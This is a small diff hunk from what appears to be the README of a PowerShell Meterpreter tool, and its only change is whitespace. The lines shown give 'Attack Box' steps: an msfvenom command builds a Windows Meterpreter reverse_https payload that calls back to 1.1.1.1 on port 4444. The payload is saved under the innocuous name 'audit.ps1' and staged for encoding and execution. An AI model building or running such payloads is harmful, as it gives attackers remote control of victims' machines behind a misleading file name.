@@ -13,7 +13,7 @@ encodedMeterpreter.ps1 script found below
 
 On Attack Box (making payload, using powershell to encode a runable string)
 
-   ./msfvenom -p windows/meterpreter/reverse_https -f psh -a x86 LHOST:1.1.1.1
+	./msfvenom -p windows/meterpreter/reverse_https -f psh -a x86 LHOST:1.1.1.1
    LPORT:4444 > audit.ps1
 
    mv audit.ps1 <same folder as encodedMeterpreter.ps1>
